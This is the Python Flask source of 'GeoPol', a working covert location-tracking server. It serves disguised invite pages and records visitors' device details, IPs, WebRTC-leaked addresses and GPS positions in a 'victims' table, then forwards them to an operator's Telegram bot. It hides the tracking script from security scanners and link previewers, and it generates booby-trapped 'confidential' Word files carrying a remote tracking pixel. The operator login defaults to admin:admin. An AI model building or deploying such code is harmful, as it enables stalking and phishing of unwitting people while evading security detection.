import os
import sqlite3
import json
import base64
import requests
import ipaddress
import re
from flask import Flask, render_template, request, jsonify, send_from_directory, Response, redirect
from functools import wraps
import telegram_api
from werkzeug.middleware.proxy_fix import ProxyFix

app = Flask(__name__, template_folder='flask_templates', static_folder='template')
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24))

# =============== DATABASE SETUP ===============
RAILWAY_VOLUME_PATH = os.environ.get('RAILWAY_VOLUME_MOUNT_PATH', '')
if RAILWAY_VOLUME_PATH:
    DB_FILE = os.path.join(RAILWAY_VOLUME_PATH, 'geopol.db')
else:
    DB_FILE = 'geopol.db'

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS victims
                        (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                         template TEXT,
                         ip TEXT,
                         os TEXT, 
                         browser TEXT,
                         status TEXT,
                         lat TEXT,
                         lon TEXT,
                         acc TEXT,
                         battery TEXT,
                         network TEXT,
                         language TEXT,
                         timezone TEXT,
                         touch TEXT,
                         webrtc TEXT,
                         date TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        # Handle migration if old table exists without new columns
        try:
            conn.execute("ALTER TABLE victims ADD COLUMN battery TEXT")
            conn.execute("ALTER TABLE victims ADD COLUMN network TEXT")
            conn.execute("ALTER TABLE victims ADD COLUMN language TEXT")
            conn.execute("ALTER TABLE victims ADD COLUMN timezone TEXT")
            conn.execute("ALTER TABLE victims ADD COLUMN touch TEXT")
            conn.execute("ALTER TABLE victims ADD COLUMN webrtc TEXT")
        except sqlite3.OperationalError:
            pass # Columns already exist
init_db()

# =============== AUTHENTICATION ===============
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin')

def check_auth(username, password):
    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD

def authenticate():
    return Response('Access Denied. Invalid credentials.', 401,
                    {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# =============== TELEGRAM SETUP ===============
TG_TOKEN = os.environ.get('TG_TOKEN', '')
CHAT_ID = os.environ.get('CHAT_ID', '')

if TG_TOKEN and CHAT_ID:
    # Format pour la rétrocompatibilité avec telegram_api.py
    token_parts = TG_TOKEN.split(':')
    if len(token_parts) >= 2:
        TELEGRAM_TOKEN = [token_parts[0], token_parts[1], CHAT_ID]
    else:
        TELEGRAM_TOKEN = ["", "", ""]
else:
    print("WARNING: OS Variables TG_TOKEN or CHAT_ID are missing. Operating in offline mode.")
    TELEGRAM_TOKEN = ["", "", ""]

def send_tg(data, msg_type):
    try:
        telegram_api.tgram_sender(msg_type, data, TELEGRAM_TOKEN)
    except Exception as e:
        print("Telegram error:", e)

def send_tg_direct(msg, reply_markup=None):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown', 'disable_web_page_preview': True}
    if reply_markup:
        payload['reply_markup'] = reply_markup
    requests.post(url, json=payload)

def edit_tg_msg(message_id, msg, reply_markup=None):
    url = f"https://api.telegram.org/bot{TG_TOKEN}/editMessageText"
    payload = {'chat_id': CHAT_ID, 'message_id': message_id, 'text': msg, 'parse_mode': 'Markdown', 'disable_web_page_preview': True}
    if reply_markup:
        payload['reply_markup'] = reply_markup
    requests.post(url, json=payload)

def get_main_menu():
    return {
        "inline_keyboard": [
            [{"text": "🔗 Générer les liens de suivi", "callback_data": "links"}],
            [{"text": "👥 Voir les 5 dernières cibles", "callback_data": "targets"}],
            [{"text": "🌐 Dashboard Web", "url": "https://VOTRE-RAILWAY-URL.up.railway.app"}, {"text": "⚙️ Statut", "callback_data": "status"}]
        ]
    }

def load_templates():
    try:
        with open('template/templates.json') as f:
            return json.load(f).get('templates', [])
    except Exception:
        return []

# =============== TELEGRAM BOT WEBHOOK ROUTES ===============
@app.route('/set_webhook')
@requires_auth
def set_webhook():
    """ Appeler cette URL (ex: /set_webhook) une fois déployé pour lier le bot à Railway """
    webhook_url = request.url_root.replace('http://', 'https://') + 'tg_webhook'
    url = f"https://api.telegram.org/bot{TG_TOKEN}/setWebhook?url={webhook_url}"
    res = requests.get(url)
    return jsonify(res.json())

@app.route('/tg_webhook', methods=['POST'])
def tg_webhook():
    """ Reçoit les commandes et clics envoyés sur Telegram """
    data = request.json
    base_url = request.url_root.replace('http://', 'https://')
    
    # Gestion des commandes textuelles
    if data and 'message' in data and 'text' in data['message']:
        chat_id = str(data['message']['chat']['id'])
        text = data['message']['text']
        
        if chat_id == CHAT_ID:
            if text.startswith('/start') or text.startswith('/menu'):
                send_tg_direct("📍 *GeoPol Control Panel*\n\nBienvenue Administrateur. Que souhaitez-vous faire ?\nCliquez sur un bouton ci-dessous :", get_main_menu())
            
    # Gestion des clics sur les boutons (Callbacks)
    elif data and 'callback_query' in data:
        callback = data['callback_query']
        chat_id = str(callback['message']['chat']['id'])
        msg_id = callback['message']['message_id']
        action = callback['data']
        cb_id = callback['id']
        
        # Notifie Telegram qu'on a bien reçu le clic (arrête l'animation de chargement sur le bouton)
        requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/answerCallbackQuery?callback_query_id={cb_id}")
        
        if chat_id == CHAT_ID:
            if action == 'main':
                edit_tg_msg(msg_id, "📍 *GeoPol Control Panel*\n\nQue souhaitez-vous faire ?", get_main_menu())
                
            elif action == 'status':
                markup = {"inline_keyboard": [[{"text": "🔙 Retour au menu", "callback_data": "main"}]]}
                edit_tg_msg(msg_id, "✅ *Statut du système*\n\n🟢 Le serveur est totalement opérationnel sur Railway.\n📡 Écoute des cibles : ACTIVE", markup)
                
            elif action == 'links':
                templates = load_templates()
                msg = "🔗 *Vos liens de Tracking prénommés :*\n_Copiez simplement le lien voulu :_\n\n"
                for t in templates:
                    msg += f"🎯 *{t['name']}*\n`{base_url}t/{t['dir_name']}/`\n\n"
                
                markup = {"inline_keyboard": [[{"text": "🔙 Retour au menu", "callback_data": "main"}]]}
                edit_tg_msg(msg_id, msg, markup)
                
            elif action == 'targets':
                msg = "👥 *5 Dernières Cibles Enregistrées :*\n\n"
                with sqlite3.connect(DB_FILE) as conn:
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM victims ORDER BY date DESC LIMIT 5")
                    victims = cursor.fetchall()
                
                if not victims:
                    msg += "Aucune cible capturée pour le moment."
                else:
                    for v in victims:
                        msg += f"🕰 *{v['date']}* (Template: `{v['template']}`)\n"
                        msg += f"🕸 IP: `{v['ip']}`\n"
                        if v['lat'] and v['lon']:
                            msg += f"🗺 [Ouvrir Carte](https://maps.google.com/?q={v['lat']},{v['lon']}) (Acc: {v['acc']}m)\n"
                        else:
                            msg += f"📵 Loc: _Non autorisée/En attente_\n"
                        msg += "──────────────\n"
                
                markup = {"inline_keyboard": [
                    [{"text": "🔄 Rafraîchir", "callback_data": "targets"}],
                    [{"text": "🔙 Retour au menu", "callback_data": "main"}]
                ]}
                edit_tg_msg(msg_id, msg, markup)

    return "OK", 200

# =============== DASHBOARD ROUTES ===============
@app.route('/')
@requires_auth
def dashboard():
    templates = load_templates()
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM victims ORDER BY date DESC")
        victims = cursor.fetchall()
    return render_template('dashboard.html', templates=templates, victims=victims, request=request)

# =============== ANTI-BOT SYSTEM ===============
def is_bot(req_or_ua):
    """Advanced heuristic to detect bots, crawlers, security scanners, and preview systems."""
    # Permet de passer soit la requête Flask entière, soit juste la chaîne User-Agent
    if hasattr(req_or_ua, 'headers'):
        ua_str = req_or_ua.headers.get("User-Agent", "")
        # Vérification 1 : Pas de User-Agent, ou entête typique manipulée
        if not ua_str or 'Accept-Language' not in req_or_ua.headers:
            # Beaucoup de scanners de sécurité et bots ne mettent pas d'Accept-Language
            return True
    else:
        ua_str = str(req_or_ua)

    if not ua_str:
        return True

    ua = ua_str.lower()
    
    # Base de signatures massives (Sécurité, OSINT, Automatisation, Sociaux)
    bot_patterns = [
        'bot', 'spider', 'crawler', 'preview', 'facebookexternalhit', 'whatsapp',
        'telegram', 'twitterbot', 'slackbot', 'discordbot', 'skypeuripreview',
        'linkedinbot', 'vkshare', 'googlebot', 'bingbot', 'yandexbot', 'duckduckbot',
        'headlesschrome', 'phantomjs', 'curl', 'wget', 'python-requests', 'datanyze',
        'shodan', 'censys', 'nmap', 'masscan', 'zgrab', 'research', 'scan', 'paloaltonetworks',
        'expanse', 'virustotal', 'urlredirect', 'mediapartners-google', 'slurp',
        'baiduspider', 'semrushbot', 'ahrefsbot', 'mj12bot', 'postman', 'httpclient',
        'java', 'urllib', 'libwww', 'go-http-client', 'ruby', 'scrapy', 'gophish',
        'puppeteer', 'playwright', 'cypress', 'outbrain', 'pinterest', 'quora'
    ]
    
    if any(bot in ua for bot in bot_patterns):
        return True
        
    return False

# =============== APP ROUTES ===============
@app.route('/t/<tpl_name>')
def serve_target_redirect(tpl_name):
    """ Redirect to add a trailing slash so that relative paths work perfectly """
    return redirect(f'/t/{tpl_name}/')

@app.route('/t/<tpl_name>/')
def serve_target(tpl_name):
    """ Serve the spoofed template page directly """
    try:
        with open(f'template/{tpl_name}/index_temp.html', 'r', encoding='utf-8') as f:
            content = f.read()
            
            # Correct broken paths in the old HTML templates
            content = content.replace('src="js/location.js"', 'src="/js/location.js"')
            content = content.replace('src="../js/location.js"', 'src="/js/location.js"')
            # Fix weird relative paths used by the original tool that go up a dir
            content = content.replace('href="../css/', 'href="css/')
            content = content.replace('href="/css/', 'href="css/')
            content = content.replace('href="/images/', 'href="images/')
            
            # Dynamic template variables
            title = request.args.get('title', 'Group Invite')
            image = request.args.get('image', 'https://i.imgur.com/lY6PFrr.png')
            desc = request.args.get('desc', 'Join this group to see the content.')
            
            content = content.replace('$TITLE$', title)
            content = content.replace('$IMAGE$', image)
            content = content.replace('$DESC$', desc)
            
            # Default fallback URL if user parameter allows it, or pre-configured
            fallback = request.args.get('fallback', 'https://www.google.com')
            content = content.replace('FALLBACK_URL', fallback)
            
            # Anti-Bot Filtering: strip JS execution if it's a known bot
            if is_bot(request):
                # Remove the location script from the page to prevent false pings
                content = content.replace('<script src="/js/location.js"></script>', '')
                content = content.replace('<script src="../js/location.js"></script>', '')
                
            return content
    except Exception as e:
        return redirect("https://www.google.fr")

@app.errorhandler(404)
def page_not_found(e):
    return redirect("https://www.google.fr")

@app.errorhandler(500)
def internal_error(e):
    return redirect("https://www.google.fr")

@app.route('/t/<tpl_name>/<path:filename>')
def serve_tpl_assets(tpl_name, filename):
    return send_from_directory(f'template/{tpl_name}', filename)

@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory('js', filename)

# =============== API ENDPOINTS (DATA COLLECTION) ===============
@app.route('/t/<tpl_name>/info_handler.php', methods=['POST'])
def info_handler(tpl_name):
    if is_bot(request) or is_bot(request.form.get('Brw', '')):
        return "OK"
        
    ip = request.remote_addr
    dev_info = {
        'os': request.form.get('Os', ''),
        'platform': request.form.get('Ptf', ''),
        'browser': request.form.get('Brw', ''),
        'cores': request.form.get('Cc', ''),
        'ram': request.form.get('Ram', ''),
        'vendor': request.form.get('Ven', ''),
        'render': request.form.get('Ren', ''),
        'ht': request.form.get('Ht', ''),
        'wd': request.form.get('Wd', ''),
        'lang': request.form.get('Lang', ''),
        'tz': request.form.get('Tz', ''),
        'net': request.form.get('Net', ''),
        'touch': request.form.get('Touch', ''),
        'bat': request.form.get('Bat', ''),
        'webrtc': request.form.get('Webrtc', ''),
        'ip': ip
    }
    send_tg(dev_info, 'device_info')
    
    with sqlite3.connect(DB_FILE) as conn:
        try:
            conn.execute("INSERT INTO victims (template, ip, os, browser, status, battery, network, language, timezone, touch, webrtc) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                         (tpl_name, ip, dev_info['os'], dev_info['browser'], 'Connected', dev_info['bat'], dev_info['net'], dev_info['lang'], dev_info['tz'], dev_info['touch'], dev_info['webrtc']))
        except sqlite3.OperationalError:
            # Fallback for old schema
            conn.execute("INSERT INTO victims (template, ip, os, browser, status) VALUES (?, ?, ?, ?, ?)",
                         (tpl_name, ip, dev_info['os'], dev_info['browser'], 'Connected'))
    
    # Try fetching IP geolocation via API (Uses WebRTC leak if public, else standard IP)
    target_ip = ip
    webrtc_str = dev_info.get('webrtc', '')
    if webrtc_str and webrtc_str != 'Not Available':
        found_ips = re.findall(r'[0-9]+(?:\.[0-9]+){3}|(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}', webrtc_str)
        for w_ip in found_ips:
            try:
                ip_obj = ipaddress.ip_address(w_ip)
                if not ip_obj.is_private and not ip_obj.is_loopback and not ip_obj.is_link_local:
                    target_ip = str(ip_obj)
                    break
            except ValueError:
                pass

    try:
        req = requests.get(f'http://ip-api.com/json/{target_ip}', timeout=3)
        if req.status_code == 200:
            ip_data = req.json()
            if ip_data.get('status') == 'success':
                ip_info = {
                    'target_ip_used': target_ip,
                    'continent': ip_data.get('timezone', '').split('/')[0] if 'timezone' in ip_data else '',
                    'country': ip_data.get('country', ''),
                    'region': ip_data.get('regionName', ''),
                    'city': ip_data.get('city', ''),
                    'org': ip_data.get('org', ''),
                    'isp': ip_data.get('isp', ''),
                    'lat': ip_data.get('lat', ''),
                    'lon': ip_data.get('lon', '')
                }
                
                # Update DB with IP location immediately
                if ip_info['lat'] and ip_info['lon']:
                    with sqlite3.connect(DB_FILE) as conn:
                        conn.execute("""
                            UPDATE victims 
                            SET lat=?, lon=?, acc=?, status=? 
                            WHERE id = (
                                SELECT id FROM victims 
                                WHERE ip=? AND template=? 
                                ORDER BY id DESC LIMIT 1
                            )
                        """, (ip_info['lat'], ip_info['lon'], "IP/WebRTC (Approx)", "IP Geolocated", ip, tpl_name))
                        
                send_tg(ip_info, 'ip_info')
    except:
        pass
    return "OK"

@app.route('/t/<tpl_name>/result_handler.php', methods=['POST'])
def result_handler(tpl_name):
    if is_bot(request):
        return "OK"
        
    loc_info = {
        'status': request.form.get('Status', ''),
        'lat': request.form.get('Lat', ''),
        'lon': request.form.get('Lon', ''),
        'acc': request.form.get('Acc', ''),
        'alt': request.form.get('Alt', ''),
        'dir': request.form.get('Dir', ''),
        'spd': request.form.get('Spd', '')
    }
    ip = request.remote_addr
    send_tg(loc_info, 'location')
    
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("""
            UPDATE victims 
            SET lat=?, lon=?, acc=?, status=? 
            WHERE id = (
                SELECT id FROM victims 
                WHERE ip=? AND template=? 
                ORDER BY id DESC LIMIT 1
            )
        """, (loc_info['lat'], loc_info['lon'], loc_info['acc'], 'Location received', ip, tpl_name))
    return "OK"

@app.route('/t/<tpl_name>/error_handler.php', methods=['POST'])
def error_handler(tpl_name):
    if is_bot(request):
        return "OK"
        
    err_info = {
        'status': request.form.get('Status', ''),
        'error': request.form.get('Error', '')
    }
    ip = request.remote_addr
    send_tg(err_info, 'error')
    
    with sqlite3.connect(DB_FILE) as conn:
         conn.execute("UPDATE victims SET status=? WHERE ip=? AND template=? ORDER BY id DESC LIMIT 1",
                     (f"Error: {err_info['error']}", ip, tpl_name))
    return "OK"

# =============== HONEYTOKEN PIXEL ROUTE ===============
@app.route('/token/<token_id>.png')
def honeytoken_pixel(token_id):
    pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
    
    # MS Word Document ne passe souvent pas de header "Accept-Language"
    # Nous bypassons l'anti-bot de base pour être sûr de capter MS Office
    ua_str = request.headers.get("User-Agent", "Unknown").lower()
    bot_patterns = ['bot', 'spider', 'crawler', 'virustotal', 'shodan', 'masscan', 'zgrab', 'censys']
    if any(bot in ua_str for bot in bot_patterns):
        return Response(pixel, mimetype="image/png")
        
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    
    # Save hit to DB
    tpl_name = f"📄 Doc_Piégé_{token_id}"
    with sqlite3.connect(DB_FILE) as conn:
        try:
            conn.execute("INSERT INTO victims (template, ip, os, browser, status, battery, network, language, timezone, touch) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                         (tpl_name, ip, "HoneyToken", user_agent, 'Opened', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A'))
        except sqlite3.OperationalError:
            conn.execute("INSERT INTO victims (template, ip, os, browser, status) VALUES (?, ?, ?, ?, ?)",
                         (tpl_name, ip, "HoneyToken", user_agent, 'Opened'))

    # Build notify data
    dev_info = {
        'os': "DOCUMENT PIÉGÉ (WEB BUG)",
        'platform': "N/A",
        'browser': user_agent,
        'cores': "N/A",
        'ram': "N/A",
        'vendor': "N/A",
        'render': "N/A",
        'ht': "N/A",
        'wd': "N/A",
        'lang': "N/A",
        'tz': "N/A",
        'net': "N/A",
        'touch': "N/A",
        'bat': "N/A",
        'ip': ip
    }
    # We borrow the existing device_info telegram msg
    send_tg(dev_info, 'device_info')
    
    # Try fetching IP geolocation via API
    try:
        req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        if req.status_code == 200:
            ip_data = req.json()
            if ip_data.get('status') == 'success':
                ip_info = {
                    'continent': ip_data.get('timezone', '').split('/')[0],
                    'country': ip_data.get('country', ''),
                    'region': ip_data.get('regionName', ''),
                    'city': ip_data.get('city', ''),
                    'org': ip_data.get('org', ''),
                    'isp': ip_data.get('isp', '')
                }
                send_tg(ip_info, 'ip_info')
    except:
        pass

    # Return 1x1 transparent PNG
    pixel = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
    return Response(pixel, mimetype="image/png")

import zipfile
import io

@app.route('/generate_docx/<token_id>')
@requires_auth
def generate_docx_honeytoken(token_id):
    url = f"{request.url_root.replace('http://', 'https://')}token/{token_id}.png"
    
    rels = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>"""

    doc_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{url}" TargetMode="External"/>
</Relationships>""".encode('utf-8')

    content_types = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>"""

    document = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
            xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
            xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
            xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
    <w:body>
        <w:p>
            <w:r>
                <w:t>CE DOCUMENT EST CONFIDENTIEL.</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:drawing>
                    <wp:inline>
                        <wp:extent cx="1" cy="1"/>
                        <wp:docPr id="1" name="Picture 1"/>
                        <a:graphic>
                            <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                                <pic:pic>
                                    <pic:nvPicPr>
                                        <pic:cNvPr id="0" name="tracker.png"/>
                                        <pic:cNvPicPr/>
                                    </pic:nvPicPr>
                                    <pic:blipFill>
                                        <a:blip r:link="rId1"/>
                                        <a:stretch><a:fillRect/></a:stretch>
                                    </pic:blipFill>
                                    <pic:spPr>
                                        <a:xfrm><a:ext cx="1" cy="1"/></a:xfrm>
                                        <a:prstGeom prst="rect"><a:avLst/></a:prstGeom>
                                    </pic:spPr>
                                </pic:pic>
                            </a:graphicData>
                        </a:graphic>
                    </wp:inline>
                </w:drawing>
            </w:r>
        </w:p>
    </w:body>
</w:document>"""

    mem_zip = io.BytesIO()
    with zipfile.ZipFile(mem_zip, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/_rels/document.xml.rels", doc_rels)
        zf.writestr("word/document.xml", document)
        zf.writestr("[Content_Types].xml", content_types)
    
    return Response(
        mem_zip.getvalue(),
        mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        headers={"Content-Disposition": f"attachment;filename=Dossier_Confidentiel_{token_id}.docx"}
    )

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)